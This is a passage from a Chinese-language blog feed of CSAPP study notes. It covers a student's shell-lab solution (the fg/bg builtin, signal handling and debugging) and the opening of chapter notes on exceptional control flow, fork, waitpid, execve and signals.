class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">do_bgfg</span><span class="params">(<span class="type">char</span> **argv)</span> <span class="comment">//argv是一个指向字符串指针的指针</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> jid,pid,ifpid,ifjid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">myjobs</span>;</span></span><br><span class="line">    <span class="type">sigset_t</span> mask;</span><br><span class="line">    sigemptyset(&amp;mask);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">1</span>]==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">       <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ifpid=<span class="built_in">sscanf</span>(argv[<span class="number">1</span>],<span class="string">&quot;%d&quot;</span>,&amp;pid);<span class="comment">//如果参数是pid则返回真</span></span><br><span class="line">    ifjid=<span class="built_in">sscanf</span>(argv[<span class="number">1</span>],<span class="string">&quot;%%%d&quot;</span>,&amp;jid);<span class="comment">//如果是jid则返回真</span></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span>(!ifpid&amp;&amp;!ifjid)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//检查pid jid是否合规</span></span><br><span class="line">    <span class="keyword">if</span>(ifjid==<span class="number">0</span>)<span class="comment">//接收pid为参数</span></span><br><span class="line">    &#123;</span><br><span class="line">      jid=pid2jid(pid);</span><br><span class="line">      <span class="keyword">if</span>(jid==<span class="number">0</span>)<span class="comment">//pid不合法</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;(%s):No such process\n&quot;</span>,argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>  <span class="comment">//接收jid作为参数</span></span><br><span class="line">    &#123;</span><br><span class="line">       <span class="keyword">if</span>(getjobjid(jobs,jid)==<span class="literal">NULL</span>)</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;%s: No such job\n&quot;</span>,argv[<span class="number">1</span>]);</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(jid==<span class="number">0</span>)<span class="comment">//接收pid为参数</span></span><br><span class="line">    &#123;</span><br><span class="line">      jid=pid2jid(pid);</span><br><span class="line">    &#125;</span><br><span class="line">    myjobs=getjobjid(jobs,jid);   </span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;fg&quot;</span>))</span><br><span class="line">    &#123;  <span class="comment">//fg的对象可能是bg也可能是st</span></span><br><span class="line">       <span class="keyword">if</span> (myjobs-&gt;state == ST)</span><br><span class="line">            kill(-(myjobs-&gt;pid), SIGCONT);</span><br><span class="line">        myjobs-&gt;state = FG;</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;mask, <span class="literal">NULL</span>);</span><br><span class="line">        waitfg(myjobs-&gt;pid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123; <span class="comment">//bg命令</span></span><br><span class="line">      myjobs-&gt;state=BG;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, myjobs-&gt;jid, myjobs-&gt;pid, myjobs-&gt;cmdline);</span><br><span class="line">      kill(-(myjobs-&gt;jid),SIGCONT);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要注意的是使用kill的时候参数pid要设置为负数，设置为负数会将pid所在进程组的所有进程关闭。</p><h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><p>这里讲一下检测的方法，在lab这个目录下运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make testxx     //出现的结果是我们编写的shell跑出的结果</span><br><span class="line"></span><br><span class="line">make rtestxx    //出现的是预期结果即正确的shell抛出的结果</span><br></pre></td></tr></table></figure><p>检查真的很有必要，在前面的函数是现阶段代码框架大致都有了，但是就像书中提到的涉及到linux信号处理的编程时十分棘手的，稍有不慎就会引发错误，而且有的错误藏得很深，可能运行几十次代码他都是正确的，但是有可能就是下一次，问题就出现了。一定要通过实验中提供的验证手段，逐个检查，遇到问题就去调试，或者用printf插入一些桩，我的方法是在容易出问题的地方（信号的阻塞与解除阻塞）打印出状态。</p><h3 id="问题一"><a href="#问题一" class="headerlink" title="问题一"></a>问题一<img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230914231829.png"></h3><p>按下CTRL+z之后，应该暂停前台进程并返回我们的shell，打印出“tsh&gt;”,但是<img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230914231927.png"></p><p>可以看到进入了处理程序，并且暂停了前台程序。原来的函数是没有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getjobpid(jobs,pid)-&gt;state=ST;<span class="comment">//将前台作业标记为ST</span></span><br></pre></td></tr></table></figure><p>这条语句的，经过测试程序会卡死到恢复信号那个步骤，试想，当我们恢复信号，上面用kill指令对pid进程组的所有进程发送SIGTSTP信号，当我们的前台进程被停止的时候，内核会向父进程发送SIGCHLD信号,触发SIGCHLD。而这个程序被卡死在了SIGCHLD的处理程序中，说的更透彻一点，其实被卡在了<img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230915020553.png"></p><p>waitpid这个函数里面，waitpid会挂起父进程（shell）等待子进程结束，而我们已经通过kill对子进程发送了SIGTSTP信号，子进程已经停止了，waitpid永远不会结束。这显然是SIGCHLD信号处理函数的漏洞，刚开始我错误的将SIGCHLD处理函数只用来处理终止的进程，没有考虑到停止的进程也会发送信号。所以我们要在SIGTSTP处理函数那里设置job的状态，是状态变为ST然后在SIGCHLD处理函数中增加条件判断</p><h2 id="知识盲点"><a href="#知识盲点" class="headerlink" title="知识盲点"></a>知识盲点</h2><ul><li><p>信号处理函数可以被其他信号处理程序中断<img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230917015600.png"></p></li><li><p>woc，看代码没看仔细，里面的Signal函数不是signal，而是对sigaction函数的封装。</p><p>Unix信号处理在不同的系统有不同的信号处理语义。</p><p>一些老的Unix系统在信号k被处理程序捕获之后就把对信号k的反应恢复到默认值（怪不得我看到有文章这样说，但实践了一下发现不是这样的），在这些系统上，每次运行之后，处理程序必须调用signal函数显示地重新设置自己，即在信号处理函数中使用signal重新设置。</p><p>像read、write这样的下系统调用潜在的会阻塞进程一段较长的时间，在一些比较早版本的unix系统中，当处理程序捕获到一个信号时，被中断的慢速系统调用在信号处理程序返回时不再继续，而是立即返回给用户一个错误条件，并将errno设置为EINTR，在这些系统上，程序员必须手动重启被中断的系统调用。</p><p>在这个lab中使用的使一个包装函数Signal，他调用了sigaction</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">handler_t</span> *<span class="title function_">Signal</span><span class="params">(<span class="type">int</span> signum, <span class="type">handler_t</span> *handler)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">action</span>, <span class="title">old_action</span>;</span></span><br><span class="line"></span><br><span class="line">    action.sa_handler = handler;  </span><br><span class="line">    sigemptyset(&amp;action.sa_mask); <span class="comment">/* block sigs of type being handled 阻塞正在处理的信号类型 */</span></span><br><span class="line">    action.sa_flags = SA_RESTART; <span class="comment">/* restart syscalls if possible  如果可能，重新启动系统调用，即系统调用被中断后不需要手动恢复*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sigaction(signum, &amp;action, &amp;old_action) &lt; <span class="number">0</span>)</span><br><span class="line">unix_error(<span class="string">&quot;Signal error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> (old_action.sa_handler);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>信号处理语义如下：</p><ul><li>只有这个处理程序当前正在处理的那种类型的信号被阻塞。</li><li>和所有信号实现一样，信号不会排队等待。</li><li>只要可能，被中断的系统调用会重新启动。</li><li>一旦设置信号处理程序，他就会一直保持。</li></ul><p>吐了原来那些信号处理函数是默认的。。。怎么说？因为当我们执行&#x2F;bin&#x2F;sleep命令时，其实是通过execve函数加载的新程序，execve加载之后信号处理函数恢复默认。</p></li></ul><p><img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230919171428.png"></p><p>全部的检测结果太长了，这里放一个比较复杂的代表了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;实现一个简单的shell，光是看官方的pdf就看了半天。&lt;/p&gt;
&lt;p&gt;其实很简单，我们只要完善七个函数就好了，其中三个信号相关的。每次更新我们都要使用make命令编译一下。&lt;img src=&quot;/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230919172643.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;这样就完成了更新。&lt;/p&gt;
&lt;p&gt;一共有七个任务：&lt;/p&gt;</summary>
    
    
    
    
    <category term="csapp" scheme="http://example.com/tags/csapp/"/>
    
    <category term="lab" scheme="http://example.com/tags/lab/"/>
    
  </entry>
  
  <entry>
    <title>第八章-异常控制流</title>
    <link href="http://example.com/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/"/>
    <id>http://example.com/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/</id>
    <published>2023-09-10T13:14:09.000Z</published>
    <updated>2023-09-10T13:18:26.553Z</updated>
    
    <content type="html"><![CDATA[<p><strong>控制流</strong> 简单来讲就是程序执行期间代码执行的顺序和方式，即程序从一个语句到另一个语句的跳转和执行顺序。</p><span id="more"></span>![](第八章-异常控制流/QQ截图20230607165922.png)<p><strong>异常控制流</strong>（Exception Control Flow）是指程序执行中发生的异常事件所导致的控制流改变。异常事件可以是许多不同类型的错误或意外情况，例如除数为零、内存访问违规、IO错误等等。</p><p>当一个异常事件发生时，程序的当前控制流会停止并开始执行异常处理程序。异常处理程序可以是开发者预先编写好的一些代码，也可以是操作系统提供的默认的异常处理程序。当异常处理程序结束后，程序会返回到发生异常的位置继续执行。</p><p>为什么要学习ECF：</p><ul><li>理解ECF帮助理解重要的系统概念。</li><li>有助于我们理解应用程序是如何与操作系统交互</li><li>有助于我们编写有趣的新型应用程序</li><li>有助于理解并发</li><li>有助于理解软件异常如何工作</li></ul><h3 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h3><p><strong>异常是控制流的突变，用来相应处理器状态的某些变化。</strong><img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230907164350.png"></p><p>举个例子：我在玩手机，女朋友喊我去吃饭，那我就要放下手头的工作去配女朋友吃饭，吃完饭我可以继续玩手机，也可以去干别的事情。</p><p>在这个例子中，<strong>正常的控制流</strong>就是指我一直玩手机，女朋友喊我就是<strong>控制流突变</strong>，处理完异常事件会发生一下三种情况：</p><ol><li>处理程序将控制返回给当前指令（我继续玩手机）</li><li>处理程序返回给如果没有异常将会执行的下一条指令（可能去睡觉）</li><li>处理程序终止被终端的程序，也就是g了。</li></ol><h4 id="异常号"><a href="#异常号" class="headerlink" title="异常号"></a>异常号</h4><p>系统中每种类型的一场都分配了一个唯一的非负整数的异常号。在系统启动时操作系统反配合初始化一张成为异常表的跳转表，该表存放的是异常处理程序的地址。异常表的起始地址放在一个叫做异常表基地址寄存器的特殊CPU寄存器里。<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230907170207.png"></p><h4 id="异常的类别"><a href="#异常的类别" class="headerlink" title="异常的类别"></a>异常的类别</h4><p>四类：<strong>中断</strong>、<strong>陷阱</strong>、<strong>故障</strong>、<strong>终止</strong><img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230907165608.png"></p><h5 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h5><p>中断是异步的，是来自处理器外部的I&#x2F;O设备的<strong>信号</strong>的结果。在指令执行过程中，中断引脚的电压变高（这是一个信号），当前指令结束后，处理器注意到中断引脚电压变高，于是从系统总线读取异常号，从而触发中断。<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230907170706.png"></p><h5 id="陷阱和系统调用"><a href="#陷阱和系统调用" class="headerlink" title="陷阱和系统调用"></a>陷阱和系统调用</h5><p><strong>陷阱是有意的异常</strong>，是执行一条指令的结果（上面的中断就不是某条指令的结果）。陷阱最重要的用途是在用户程序和内核之间提供一个像过程一样的接口，叫做系统调用。读文件（read）、创建新进程（fork）等都是内核提供的服务，用户程序通过<code>syscall n</code>指令来请求服务n，这条指令会导致一个道异常处理程序的陷阱。</p><h5 id="故障"><a href="#故障" class="headerlink" title="故障"></a>故障</h5><p>故障由错误情况引起，可能被故障处理程序修正。</p><h5 id="终止"><a href="#终止" class="headerlink" title="终止"></a>终止</h5><p>终止是不可恢复的致命错误造成的结果，终止处理程序从不将控制返回给应用程序。</p><h4 id="linux系统调用"><a href="#linux系统调用" class="headerlink" title="linux系统调用"></a>linux系统调用</h4><p>使用syscall指令可以调用任何系统调用，然而我们更多使用的是一些封装好的系统级函数。<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909013737.png"></p><p>来看一下系统级函数的实际应用<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909013802.png"></p><p>对应的汇编内容为<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909013850.png"></p><p>可以看到，系统调用编号被放置在rax寄存器，rdi,rsi,rdx,r10,r8,r9依次传递第一二至第六个参数。</p><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>进程的经典定义是一<strong>个执行中的程序的实例</strong>。系统中的每个程序都运行在某个进程的上下文中。<strong>上下文</strong>是由程序正确运行所需的状态组成的。状态包括存放在内存中的程序的代码和数据，它的栈、通用目的寄存器的内容、程序计数器、环境变量以及打开文件描述符的集合。得益于进程这一抽象，我们的程序好像是系统中唯一运行的程序，好像独占的使用处理器和内存。</p><h4 id="逻辑控制流"><a href="#逻辑控制流" class="headerlink" title="逻辑控制流"></a>逻辑控制流</h4><p><img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909014752.png"></p><p>PC的值组成的序列叫做逻辑控制流，如上图所示共有三个逻辑流即</p><p>PCa1、PCa2；</p><p>PCb；</p><p>PCc1、PCc2；</p><p>进程是轮流使用处理器的，每个进程执行它流的一部分然后被抢占（暂时挂起），然后处理其他进程。</p><h4 id="并发流"><a href="#并发流" class="headerlink" title="并发流"></a>并发流</h4><p>有交替的逻辑流就是并发流，A和B并发，A和C并发，B和C不是并发，因为B进程结束的时候C进程才开始，两个进程并没有时间上的重合。</p><h3 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h3><p>每个进程都有一个唯一的整数进程ID（PID）。getpid函数返回调用进程的PID，getppid函数返回它的父进程的PID（创建调用进程的进程）。</p><h4 id="创建和终止进程"><a href="#创建和终止进程" class="headerlink" title="创建和终止进程"></a>创建和终止进程</h4><p>进程的三种状态：运行、停止、终止。</p><p>父进程可以通过fork函数创建一个新的运行的子进程。子进程和父进程几乎完全一样，最大的区别是他们具有不同的PID。fork函数被调用一次，却返回两次，一次返回父进程，一次返回给子进程。在父进程中fork返回创建的子进程的PID，在子进程中fork返回0。<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909020033.png"></p><p>这个程序可以帮助我们理解fork函数。fork之后产生了一个子进程，子进程和父进程的代码完全相同，但是子进程不是从头开始运行，而是从创建进程的下一条语句开始执行即红框圈中的部分，所以我们可以理解为红框所圈中的部分被执行了两次，一次是在子进程中，一次是在父进程中。在子进程中fork返回0，执行if语句里的内容，父进程中PID为正，执行下面的printf，所以得到<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909020535.png"></p><p>值得注意的是子进程和父进程被执行的顺序不是固定的，也就是可能在另一台机器甚至在这台机器再运行一遍程序都有可能先打印child。</p><p>子进程和父进程是<strong>共享文件</strong>的，在父进程调用fork时，stdout文件是打开的，指向屏幕，子进程继承了这个文件，因此它的输入也是指向屏幕的。</p><h4 id="回收子进程"><a href="#回收子进程" class="headerlink" title="回收子进程"></a>回收子进程</h4><p>当一个进程由于某种原因突然终止时，内核并不是立即把他从系统中清除。进程被保持在一种已终止的状态中直到它被父进程回收。当父进程回收子进程时内核将子进程的退出状态传递给父进程，然后抛弃，从此该进程就不存在了。</p><p>一个进程可以通过调用waitpid函数来等待它的子进程终止或停止。<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909021419.png"></p><p>在默认情况下（options&#x3D;0时），waiopid挂起<strong>调用进程</strong>（父进程）的执行，直到它的等待<strong>集合</strong>中的<strong>一个</strong>子进程终止。如果等待集合中的一个子进程再刚调用的时候已经终止了，那么waitpid立即返回。在以上两种情况下waitpid函数返回已终止的子进程的PID。</p><p><strong>集合成员</strong></p><ul><li>如果参数列表里的pid&gt;0,那么等待集合就是一个单独的子进程，进程id等于PID。</li><li>如果PID&#x3D;-1，那么等待集合就是由父进程的所有子进程组成的。</li></ul><p><strong>修改默认行为</strong></p><p><img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909022520.png"></p><p><strong>检查回收子进程的退出状态</strong></p><p>如果statusp参数是非空的，也就是将第二个参数设置为了一个int的地址，那么waitpid函数将会在改地址处存放子进程的状态信息。如果不需要这些状态信息，填入NULL即可。<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909022934.png"></p><p>这里的退出状态为<code>exit n</code>中n。</p><p>来个例子理解一下</p><p><img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909023058.png"></p><p>pid&#x3D;-1代表回收所有子进程，NULL代表不需要子进程的状态信息，options是默认的0。</p><p><img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909023805.png"></p><h4 id="让进程休眠"><a href="#让进程休眠" class="headerlink" title="让进程休眠"></a>让进程休眠</h4><p><strong>sleep</strong>函数将一个进程挂起指定的时间（单位秒），如果请求时间量已经到了sleep返回0，否则返回还剩下的要休息的秒数，其实这两种属于同一种情况请求时间量到了，剩余休眠时长自然为0。</p><p><strong>pause</strong>函数让调用进程休眠，直到该进程接收到一个信号。</p><h4 id="加载并运行程序"><a href="#加载并运行程序" class="headerlink" title="加载并运行程序"></a>加载并运行程序</h4><p><strong>execve</strong>函数在当前进程的上下文中加载并运行一个新程序。新的进程继承原进程的PID。</p><p><img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909024531.png"></p><p>filename是可执行文件，可以是名字也可以是路径。argv为参数列表，envp为环境变量列表，要注意这两个表都要以NULL结尾，默认环境变量为0。来个例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//execve.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">char</span>*argv[]=&#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line">        <span class="type">char</span>*envp[]=&#123;<span class="number">0</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I am process 1\n&quot;</span>);</span><br><span class="line">        execve(<span class="string">&quot;execve1&quot;</span>,argv,envp);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hhh&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//execve1.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I AM PROCESS 2\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909030353.png"></p><p>可以看到在execve函数执行完之后，原进程的代码就不再被执行了。</p><h3 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h3><p>一个信号就是一条小消息。他通知进程系统中发生了一个某种类型的事件。<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909031118.png"></p><p><img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909031155.png"></p><p>可以看出，信号是异常的一种。</p><p><strong>信号表：</strong><img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909165520.png"></p><h4 id="信号术语"><a href="#信号术语" class="headerlink" title="信号术语"></a>信号术语</h4><p>传送一个信号到达目的进程是由两个不同步骤组成的：</p><ul><li>发送信号。<strong>内核</strong>通过更新目的进程的上下文中的某个状态，发送一个信号给目的进程。发送信号的原因：1）内核检测到一个系统事件，如除零错误。2）一个进程调用了kill函数发送信号。</li><li>接收信号。当目的进程被内核强迫以某种形式对信号作出反应，他就接受了信号。</li></ul><h4 id="发送信号"><a href="#发送信号" class="headerlink" title="发送信号"></a>发送信号</h4><p>发送信号的机制基于<strong>进程组</strong>这一概念。</p><p><strong>进程组</strong>：每个进程都只属于一个进程组，进程组由一个正整数进程组ID标识。getpgrp函数返回当前进程的进程组。默认的，一个子进程和它的父进程同属于一个进程组，一个进程可以通过setpgid函数来改变自己或者其他进程的进程组。<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909143156.png"></p><p>该函数将进程pid的进程组改为gpid。特殊的，当pid为0，那么就使用当前进程的PID，如果gpid为0，那么就是用pid指定的进程的PID作为进程组的ID。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//进程15213</span></span><br><span class="line">setpgid（<span class="number">0</span>，<span class="number">0</span>）</span><br></pre></td></tr></table></figure><p>该函数会创建一个gpid为15213的进程组，并将进程15213加入到这个新的进程组中。</p><p><strong>1.使用 &#x2F;bin&#x2F;kill 程序发送信号</strong></p><p>&#x2F;bin&#x2F;kill程序可以向另外的进程发送任意的信号。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">linux&gt; </span><span class="language-bash">/bin/kill -9 15213</span></span><br></pre></td></tr></table></figure><p>实现的功能是发送信号9给进程15213。一个负的pid会导致信号被发送到进程组pid中的每个进程。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">linux&gt; </span><span class="language-bash">/bin/kill -9 -15213</span></span><br></pre></td></tr></table></figure><p>实现的功能是发送信号9给进程组15213中的每一个进程。</p><p><strong>2.从键盘发送信号</strong></p><p>Unix shell使用作业（job）这个抽象概念来表示为对一条命令行求值而创建的进程。在任何时刻，至多有一个前台作业和0或多个后台作业。job是一个或多个进程的集合。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls | sort</span><br></pre></td></tr></table></figure><p>键入该命令shell进程会创建一个由两个进程组成的前台作业，一个进程运行ls程序，另一个进程运行sort程序。shell为每个作业创建一个独立的进程组，进程组ID通常取自作业中父进程的一个。<img 